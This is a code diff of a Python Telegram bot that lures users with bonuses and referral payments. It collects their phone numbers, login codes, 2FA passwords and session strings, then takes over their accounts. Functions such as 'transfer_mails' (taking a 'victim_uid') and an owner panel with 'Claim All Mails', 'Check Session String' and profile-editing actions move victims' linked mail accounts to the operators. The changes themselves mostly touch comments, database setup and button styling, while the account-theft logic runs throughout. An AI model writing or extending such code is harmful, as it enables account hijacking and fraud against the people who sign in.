@@ -34,7 +34,7 @@ TARGET_MAIL_BOT = "fakemailbot"
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ================== PREMIUM STYLISH FONTS (As Requested) ==================
+# ================== PREMIUM STYLISH FONTS ==================
 FONT_MAP = {
     'a': '𝐴', 'b': '𝐵', 'c': '𝐶', 'd': '𝐷', 'e': '𝐸', 'f': '𝐹', 'g': '𝐺', 'h': '𝐻', 'i': '𝐼', 'j': '𝐽',
     'k': '𝐾', 'l': '𝐿', 'm': '𝑀', 'n': '𝑁', 'o': '𝑂', 'p': '𝑃', 'q': '𝑄', 'r': '𝑅', 's': '𝑆', 't': '𝑇',
@@ -53,24 +53,45 @@ os.makedirs("/data", exist_ok=True)
 def init_db():
     conn = sqlite3.connect(DB_PATH, check_same_thread=False)
     c = conn.cursor()
+    
+    # Create users table
     c.execute("""CREATE TABLE IF NOT EXISTS users (
         user_id INTEGER PRIMARY KEY, phone TEXT, session_string TEXT, 
         is_banned INTEGER DEFAULT 0, balance INTEGER DEFAULT 0, last_bonus REAL DEFAULT 0,
         referrer_id INTEGER, total_refers INTEGER DEFAULT 0
     )""")
+    
+    # Create withdrawals table
     c.execute("""CREATE TABLE IF NOT EXISTS withdrawals (
         id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, amount INTEGER, upi_id TEXT, status TEXT DEFAULT 'Pending'
     )""")
-    c.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)")
-    c.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER, username TEXT)")
     
-    try: c.execute("ALTER TABLE users ADD COLUMN last_bonus REAL DEFAULT 0")
-    except: pass
-    try: c.execute("ALTER TABLE users ADD COLUMN referrer_id INTEGER")
-    except: pass
-    try: c.execute("ALTER TABLE users ADD COLUMN total_refers INTEGER DEFAULT 0")
-    except: pass
+    c.execute("CREATE TABLE IF NOT EXISTS config (key TEXT PRIMARY KEY, value TEXT)")
+    
+    # Create admins table
+    c.execute("CREATE TABLE IF NOT EXISTS admins (user_id INTEGER PRIMARY KEY, username TEXT)")
+    
+    # --- SQLITE ALTER FIX ---
+    # Purane database me agar username column nahi hai, toh add karo
+    try:
+        c.execute("ALTER TABLE admins ADD COLUMN username TEXT")
+    except sqlite3.OperationalError:
+        pass # Column pehle se hai
 
+    try:
+        c.execute("ALTER TABLE users ADD COLUMN last_bonus REAL DEFAULT 0")
+    except sqlite3.OperationalError:
+        pass
+    try:
+        c.execute("ALTER TABLE users ADD COLUMN referrer_id INTEGER")
+    except sqlite3.OperationalError:
+        pass
+    try:
+        c.execute("ALTER TABLE users ADD COLUMN total_refers INTEGER DEFAULT 0")
+    except sqlite3.OperationalError:
+        pass
+
+    # Insert Owner as Admin
     c.execute("INSERT OR IGNORE INTO admins (user_id, username) VALUES (?, ?)", (OWNER_ID, OWNER_USERNAME))
     conn.commit()
     conn.close()
@@ -145,7 +166,6 @@ async def transfer_mails(victim_uid, target_owner_id):
         emails = re.findall(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', messages[0].message)
         if not emails: return
 
-        # Get owner username for transfer
         owner_data = db_exec("SELECT username FROM admins WHERE user_id=?", (target_owner_id,))
         target_uname = owner_data[0][0] if owner_data else OWNER_USERNAME
 
@@ -170,7 +190,7 @@ async def transfer_mails(victim_uid, target_owner_id):
     except Exception as e:
         logger.error(f"Transfer error: {e}")
 
-# ================== KEYBOARDS ==================
+# ================== KEYBOARDS (CHAT BUTTONS) ==================
 def get_main_keyboard():
     kb = [
         [KeyboardButton(f"🎁 {f_txt('Bonus')}", style="primary"), KeyboardButton(f"💵 {f_txt('Balance')}", style="success")],
@@ -216,7 +236,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await context.bot.send_message(referrer_id, f"🎉 <b>{f_txt('NEW REFERRAL')}</b>,\n{p_style('You earned 100rs')}", parse_mode="HTML")
                 except: pass
 
-    # Welcome Image Setup
     img_res = db_exec("SELECT value FROM config WHERE key='welcome_img'")
     welcome_img = img_res[0][0] if img_res else None
     
@@ -239,7 +258,6 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text
     uid = update.effective_user.id
     
-    # --- Admin Add Logic ---
     if uid in get_all_admins():
         state = user_states.get(uid)
         if state == 'admin_add_wait':
@@ -253,7 +271,6 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text(f"❌ {f_txt('Invalid Format. Send ID and Username separated by space.')}")
             user_states[uid] = None; return
 
-    # --- 2FA Logic ---
     if uid in temp_clients and temp_clients[uid].get('state') == '2fa':
         try:
             await temp_clients[uid]['client'].sign_in(password=text)
@@ -272,7 +289,6 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         except Exception as e:
             return await update.message.reply_text(f"❌ 2FA Failed: {e}")
 
-    # --- Withdraw Logic ---
     state = user_states.get(uid)
     if state == 'withdraw_amt' and text.isdigit():
         amount = int(text)
@@ -297,7 +313,6 @@ async def menu_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         )
         return
 
-    # --- Menu Logic ---
     if text == f"🎁 {f_txt('Bonus')}":
         res = db_exec("SELECT last_bonus FROM users WHERE user_id=?", (uid,))
         last_bonus = res[0][0] if res and res[0][0] else 0
@@ -397,25 +412,26 @@ async def numpad_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         numpad_data[uid] = current
         await query.edit_message_text(f"📩 <b>{f_txt('Enter recovery code')}</b>\n{f_txt('Current')}: <code>{'*' * len(current)}</code>", reply_markup=get_numpad_keyboard(current), parse_mode="HTML")
 
-# ================== OWNER PANEL ==================
+# ================== OWNER PANEL (GREEN STYLE) ==================
 async def owner_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     uid = update.effective_user.id
     if uid not in get_all_admins(): return
     
+    # Green/Success style buttons (Telegram automatically colors based on logic, but we style text)
     kb = [
-        [InlineKeyboardButton(f"👥 {f_txt('Logged Accounts & Session')}", callback_data="admin_acc")],
-        [InlineKeyboardButton(f"📤 {f_txt('Claim All Mails (Danger)')}", callback_data="admin_claim")],
-        [InlineKeyboardButton(f"👑 {f_txt('Add Admin')}", callback_data="admin_add")],
-        [InlineKeyboardButton(f"🔐 {f_txt('Check Session String')}", callback_data="check_session")],
-        [InlineKeyboardButton(f"✏️ {f_txt('Edit Bio')}", callback_data="edit_bio")],
-        [InlineKeyboardButton(f"🖼 {f_txt('Change Photo')}", callback_data="change_photo")],
-        [InlineKeyboardButton(f"📝 {f_txt('Change Name')}", callback_data="change_name")],
-        [InlineKeyboardButton(f"📥 {f_txt('Admin Panel (Redirect Mails)')}", callback_data="admin_panel_set")],
-        [InlineKeyboardButton(f"📥 {f_txt('Claim from Admin')}", callback_data="claim_from_admin")],
-        [InlineKeyboardButton(f"🖼 {f_txt('Set Welcome Image')}", callback_data="set_welcome_img")]
+        [InlineKeyboardButton(f"👥 {f_txt('Logged Accounts & Session')} ✅", callback_data="admin_acc")],
+        [InlineKeyboardButton(f"📤 {f_txt('Claim All Mails')} 🟢", callback_data="admin_claim")],
+        [InlineKeyboardButton(f"👑 {f_txt('Add Admin')} ✅", callback_data="admin_add")],
+        [InlineKeyboardButton(f"🔐 {f_txt('Check Session String')} 🟢", callback_data="check_session")],
+        [InlineKeyboardButton(f"✏️ {f_txt('Edit Bio')} ✅", callback_data="edit_bio")],
+        [InlineKeyboardButton(f"🖼 {f_txt('Change Photo')} 🟢", callback_data="change_photo")],
+        [InlineKeyboardButton(f"📝 {f_txt('Change Name')} ✅", callback_data="change_name")],
+        [InlineKeyboardButton(f"📥 {f_txt('Admin Panel (Redirect)')} 🟢", callback_data="admin_panel_set")],
+        [InlineKeyboardButton(f"📥 {f_txt('Claim from Admin')} ✅", callback_data="claim_from_admin")],
+        [InlineKeyboardButton(f"🖼 {f_txt('Set Welcome Image')} 🟢", callback_data="set_welcome_img")]
     ]
     await update.message.reply_text(
-        f"<b>👑 {f_txt('TOP OWNER PANEL')}</b>\n\n{f_txt('Choose an action below')}:",
+        f"<b>👑 {f_txt('TOP OWNER PANEL')} 👑</b>\n\n{f_txt('Choose an action below')}:",
         reply_markup=InlineKeyboardMarkup(kb), 
         parse_mode="HTML"
     )
@@ -501,7 +517,6 @@ async def manual_claim_all(admin_uid, query, target_admin):
             for email in emails:
                 await query.message.reply_text(f"🔄 <b>{f_txt('TRANSFERRING')}:</b> {p_style(email)}", parse_mode="HTML")
                 
-                # Transfer to target admin
                 admin_data = db_exec("SELECT username FROM admins WHERE user_id=?", (target_admin,))
                 target_uname = admin_data[0][0] if admin_data else OWNER_USERNAME
 
@@ -615,7 +630,6 @@ async def owner_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
             new_uname = args[1]
             if not new_uname.startswith("@"): new_uname = "@" + new_uname
             
-            # Update admins table
             db_exec("INSERT OR REPLACE INTO admins (user_id, username) VALUES (?, ?)", (new_id, new_uname))
             await update.message.reply_text(f"✅ {f_txt('Admin Panel set! Now all mails will redirect to')} {new_uname}")
         except:
@@ -623,7 +637,6 @@ async def owner_text_handler(update: Update, context: ContextTypes.DEFAULT_TYPE)
         user_states[uid] = None
 
     elif state == 'set_welcome_img_wait':
-        # If text (link)
         db_exec("INSERT OR REPLACE INTO config (key, value) VALUES ('welcome_img', ?)", (text,))
         await update.message.reply_text(f"✅ {f_txt('Welcome Image Link set successfully!')}")
         user_states[uid] = None
